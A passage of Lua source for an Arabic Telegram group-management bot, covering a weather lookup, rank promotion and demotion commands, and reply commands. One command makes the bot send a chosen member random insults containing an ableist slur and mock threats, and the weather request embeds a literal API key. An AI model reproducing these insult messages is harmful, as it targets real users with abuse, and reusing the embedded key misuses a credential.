   local res = http.request("http://api.openweathermap.org/data/2.5/weather?q="..URL.escape(Ptrn).."&appid=de8f6f3e0b7f8a36a3e05f47418643bf")
   local jtab = json:decode(res)
   for i=1,5 do
    local F1,C1 = temps(jtab.list[i].main.temp_min)
    local F2,C2 = temps(jtab.list[i].main.temp_max)
    if jtab.list[i].weather[1].main == "Thunderstorm" then
     status = "⛈ عاصف"
    elseif jtab.list[i].weather[1].main == "Drizzle" then
     status = "🌦 امطار خفيفه"
    elseif jtab.list[i].weather[1].main == "Rain" then
     status = "🌧 مطر شديد"
    elseif jtab.list[i].weather[1].main == "Snow" then
     status = "🌨 مثلج"
    elseif jtab.list[i].weather[1].main == "Atmosphere" then
     status = "🌫 مغبر"
    elseif jtab.list[i].weather[1].main == "Clear" then
     status = "🌤️صاف"
    elseif jtab.list[i].weather[1].main == "Clouds" then
     status = "☁️ غائم"
    elseif jtab.list[i].weather[1].main == "Extreme" then
     status = "-------"
    elseif jtab.list[i].weather[1].main == "Additional" then
     status = "-------"
    else
     status = "-------"
    end
    if i == 1 then
     day = "• طقس يوم غد"
    elseif i == 2 then
     day = "• طقس بعد غد"
    elseif i == 3 then
     day = "• طقس بعد 3 ايام"
    elseif i == 4 then
     day = "• طقس بعد 4 ايام"
    elseif i == 5 then
      day = "• طقس بعد 5 ايام"
    end
    after = after.."- "..day..status.."تقريبا \n🔺C"..C2.."°  *-*  F"..F2.."°\n🔻C"..C1.."°  *-*  F"..F1.."°\n"
   end
   Text = today.."• حاله الطقس ل5 ايام القادمه 🔽:\n"..after
   KASPERdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
  else
   Text  = "• لا توجد مدينه بهذا الاسم 🌐"
   KASPERdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
  end end
--     By Developer KASPER     -- 
if (msg.sender_user_id_) then
local text = msg.content_.text_:gsub("[Pp]rice", "Nerkh")
if text:match("^المطور$") and KASPER11(msg) then
local nerkh = KASPERdx1:get(KASPER.."nerkh")
if nerkh then
KASPERdx(msg.chat_id_, msg.id_, 1, nerkh, 1, "md")
elseif KASPERdx1:get(KASPER.."lang:gp:" .. msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙Bot not found ", 1, "md")
else
KASPERdx(msg.chat_id_, msg.id_, 1, "- 𝐓𝐨 𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞 𝐖𝐢𝐭𝐡 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫  𖠂\n\n- 𝗦𝘂𝗱𝗼 𖠙 @"..SudoKASPER..",", 1, "md")
end end end 
--     By Developer KASPER     -- 
if text and text:match('^هينه @(.*)') and KASPER11(msg) then 
local username = text:match('^هينه @(.*)') 
function KASPER(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
KASPERdx(msg.chat_id_, msg.id_, 1, 'شكد غبي لعد تريدني اهين نفسي ؟؟ 🙆😹', 1, 'md') 
return false 
end  
if tonumber(result.id_) == tonumber(bot_owner) then 
KASPERdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مطوري ؟ 🌚🙆', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(218385683) then 
KASPERdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
return false  
end  
if KASPERdx1:sismember(KASPER.."bot:monsh:"..msg.chat_id_,result.id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك المنشئ ؟ ??🙆', 1, 'md') 
return false
end 
local KASPER = "صار ستاذي 💞🏃" 
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md') 
local KASPER = {  "لكك جرجف @"..username.." احترم تاجراسك لا اكتلك واخري على كبرك،💩","هيو جرجف @"..username.." لتضل تمسلت حيوان دوختنه،😐👊","حبيبي @"..username.." راح احاول احترمك هالمره بلكي تبطل حيونه، 🤔🔪","هيو الحضينه @"..username.."شبيك تكمز حيوان 🤕👊","باع هذا المنغولي @"..username.."شبيك حبي مغير علاجك ؟ صير عاقل لا اخذك للسده 🤒🤙",}
KASPERdx(msg.chat_id_, result.id_, 1,''..KASPER[math.random(#KASPER)]..'', 1, 'html') 
else  
KASPERdx(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعة', 1, 'md') 
end end 
resolve_username(username,KASPER)
end
--     By Developer KASPER     -- 
if text:match("^هينه$") or text:match("^بعد هينه$") or text:match("^هينه بعد$") or text:match("^لك هينه$") or text:match("^هينها$") or text:match("^هينهه$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
KASPERdx(msg.chat_id_, msg.id_, 1, 'شكد غبي لعد تريدني اهين نفسي ؟؟ 🙆😹', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
KASPERdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مطوري ؟ 🌚🙆', 1, 'md') 
return false
end 
if tonumber(result.sender_user_id_) == tonumber(218385683) then  
KASPERdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
return false
end 
if KASPERdx1:sismember(KASPER.."bot:monsh:"..msg.chat_id_,result.sender_user_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك المنشئ ؟ 🌚🙆', 1, 'md') 
return false
end 
local KASPER = "صار ستاذي 💞🏃" 
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md') 
local KASPER = {"لك جرجف احترم تاجراسك لا اكتلك واخري على كبرك،💩","هيو جرجف لتضل تمسلت حيوان دوختنه،😐👊","جعب البريك راح احاول احترمك هالمره بلكي تبطل حيونه، 🤔🔪","هيو الحضينه شبيك تكمز حيوان 🤕👊","باع هذا المنغولي شبيك حبي مغير علاجك ؟ صير عاقل لا اخذك للسده 🤒🤙"} 
KASPERdx(msg.chat_id_, result.id_, 1,''..KASPER[math.random(#KASPER)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end end
--     By Developer KASPER     -- 
if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") or text:match("^بوسها بعد$") or text:match("^بوسهه$") then
function bosha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
KASPERdx(msg.chat_id_, msg.id_, 1, ' بس فهمني شون ابوس نفسي وتدلل 🤭😹', 1, 'md')
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
KASPERdx(msg.chat_id_, msg.id_, 1, 'مواححح احلى بوسةه المطوري😻🔥💗 @'..SudoKASPER, 1, 'html')
return false
end 
local KASPER = "صار ستاذي 💞🏃" 
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md') 
local KASPER = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
KASPERdx(msg.chat_id_, result.id_, 1,''..KASPER[math.random(#KASPER)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosha)   
end end
--     By Developer KASPER     -- 
if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") or text:match("^بوسه بعد$") then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
KASPERdx(msg.chat_id_, msg.id_, 1, ' بس فهمني شون ابوس نفسي وتدلل 🤭😹', 1, 'md')
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
KASPERdx(msg.chat_id_, msg.id_, 1, 'مواححح احلى بوسةه المطوري😻🔥💗 @'..SudoKASPER, 1, 'html')
return false
end 
local KASPER = "صار ستاذي 💞🏃" 
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md') 
local KASPER = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
KASPERdx(msg.chat_id_, result.id_, 1,''..KASPER[math.random(#KASPER)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end end
--     By Developer KASPER     -- 
-------- Set Sudo3
if is_sudo(msg) then
if text ==('رفع مطور رتبه ثالثه') or text ==('رفع مطور') or text ==('اضف مطور') and KASPER11(msg) then
function sudo_reply(extra, result, success)
KASPERdx1:sadd(KASPER..'bot:admins:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم رفعه مطور رتبه ثالثه𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and text:match('^رفع مطور رتبه ثالثه @(.*)') and KASPER11(msg) then
local username = text:match('^رفع مطور رتبه ثالثه @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:sadd(KASPER..'bot:admins:',result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم رفعه مطور رتبه ثالثه𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer KASPER     -- 
-------- Rem Sudo3
if text ==('تنزيل مطور رتبه ثالثه') or text ==('تنزيل مطور') or text ==('حذف مطور') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:srem(KASPER..'bot:admins:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم تنزيله من المطورين??\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مطور رتبه ثالثه @(.*)') and KASPER11(msg) then
local username = text:match('^تنزيل مطور رتبه ثالثه @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:srem(KASPER..'bot:admins:',result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم تنزيله من المطورين𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer KASPER     -- 
-------- Set Onall
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير عام') and KASPER11(msg) then
function raf_reply(extra, result, success)
KASPERdx1:sadd(KASPER..'bot:onall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم رفعه مدير عام𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and KASPER11(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:sadd(KASPER..'bot:onall:',result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم رفعه مدير عام𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
--     By Developer KASPER     -- 
-------- Rem Onall
if text ==('تنزيل مدير عام') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:srem(KASPER..'bot:onall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم تنزيله من المدراء𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and KASPER11(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:srem(KASPER..'bot:onall:',result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم تنزيله من المدراء𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer KASPER     -- 
-------- Set Moall
if is_onall(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if text ==('رفع ادمن عام') then
function raf_reply(extra, result, success)
KASPERdx1:sadd(KASPER..'bot:moall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم رفعه ادمن عام𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and KASPER11(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:sadd(KASPER..'bot:moall:',result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم رفعه ادمن عام𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
--     By Developer KASPER     -- 
-------- Rem Moall
if text ==('تنزيل ادمن عام') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:srem(KASPER..'bot:moall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم تنزيله من الادمنيه𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and KASPER11(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:srem(KASPER..'bot:moall:',result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم تنزيله من الادمنيه𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer KASPER     -- 
-------- Set Vipall
if is_moall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز عام') and KASPER11(msg) then
function raf_reply(extra, result, success)
KASPERdx1:sadd(KASPER..'bot:vpall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم رفعه مميز عام𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and KASPER11(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:sadd(KASPER..'bot:vpall:',result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم رفعه مميز عام𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer KASPER     -- 
-------- Rem Vipall
if text ==('تنزيل مميز عام') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:srem(KASPER..'bot:vpall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم تنزيله من المميزين𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and KASPER11(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:srem(KASPER..'bot:vpall:',result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم تنزيله من المميزين𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer KASPER     -- 
-------- Set Monsh
if is_vpall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ اساسي') and KASPER11(msg) then
function raf_reply(extra, result, success)
KASPERdx1:sadd(KASPER..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم رفعه منشئ اساسي𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and KASPER11(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:sadd(KASPER..'bot:monsh:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم رفعه منشئ اساسي𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer KASPER     -- 
-------- Rem Monsh
if text ==('تنزيل منشئ اساسي') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:srem(KASPER..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم تنزيله من الاساسيين𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and KASPER11(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:srem(KASPER..'bot:monsh:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم تنزيله من الاساسيين𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer KASPER     -- 
-------- Set Monsh2
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ') and KASPER11(msg) then
function raf_reply(extra, result, success)
KASPERdx1:sadd(KASPER..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم رفعه منشئ𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and KASPER11(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:sadd(KASPER..'bot:monsh2:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","✟︙✟︙تم رفعه منشئ𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer KASPER     -- 
-------- Rem Monsh2
if text ==('تنزيل منشئ') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:srem(KASPER..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم تنزيله من المنشئين𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and KASPER11(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:srem(KASPER..'bot:monsh2:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم تنزيله من المنشئين𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer KASPER     -- 
-------- Set Owner
if is_monsh2(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:sadd(KASPER..'bot:owners:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم رفعه مدير𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and KASPER11(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:sadd(KASPER..'bot:owners:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم رفعه مدير𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer KASPER     -- 
-------- Rem Owner
if text ==('تنزيل مدير') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم تنزيله من المدراء𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and KASPER11(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم تنزيله من المدراء𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer KASPER     -- 
-------- Set Momod
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:sadd(KASPER..'bot:momod:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم رفعه ادمن𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and KASPER11(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:sadd(KASPER..'bot:momod:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم رفعه ادمن𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer KASPER     -- 
-------- Rem Momod
if text ==('تنزيل ادمن') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم تنزيله من الادمنيه𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and KASPER11(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم تنزيله من الادمنيه𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer KASPER     -- 
-------- Set Vipmem
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:sadd(KASPER..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم رفعه مميز𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and KASPER11(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:sadd(KASPER..'bot:vipmem:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم رفعه مميز𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer KASPER     -- 
-------- Rem Vipmem
if text ==('تنزيل مميز') and KASPER11(msg) then
function prom_reply(extra, result, success)
KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙تم تنزيله من المميزين𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and KASPER11(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","✟︙تم تنزيله من المميزين𓍢\n✟︙بواسطه ، "..renk_KASPER(msg).."\n")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '*✟︙ المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end 
--     By Developer KASPER     -- 
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then 
function promote_by_reply(extra, result, success)
if is_leaderid(result.sender_user_id_) == true then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يمكنك تنزيل المطور الاساسي ", 1, 'md')
return false 
end
if KASPERdx1:sismember(KASPER..'bot:admins:',result.sender_user_id_) then
sudo3 = 'مطور ثالث ، ' else sudo3 = '' end
if KASPERdx1:sismember(KASPER..'bot:onall:',result.sender_user_id_) then
onall = 'مدير عام ، ' else onall = '' end
if KASPERdx1:sismember(KASPER..'bot:moall:',result.sender_user_id_) then
moall = 'ادمن عام ، ' else moall = '' end
if KASPERdx1:sismember(KASPER..'bot:vpall:',result.sender_user_id_) then
vpall = 'مميز عام ، ' else vpall = '' end
if KASPERdx1:sismember(KASPER..'bot:monsh:'..msg.chat_id_, result.sender_user_id_) then
monsh = 'منشئ اساسي ،  ' else monsh = '' end
if KASPERdx1:sismember(KASPER..'bot:monsh2:'..msg.chat_id_, result.sender_user_id_) then
monsh2 = 'منشئ ، ' else monsh2 = '' end 
if KASPERdx1:sismember(KASPER..'bot:owners:'..msg.chat_id_, result.sender_user_id_) then
owner = 'مدير ، ' else owner = '' end
if KASPERdx1:sismember(KASPER..'bot:momod:'..msg.chat_id_, result.sender_user_id_) then
momod = 'ادمن ، ' else momod = '' end
if KASPERdx1:sismember(KASPER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'مميز' else vipmem = ''
end
if dxdx(result.sender_user_id_,msg.chat_id_) ~= false then
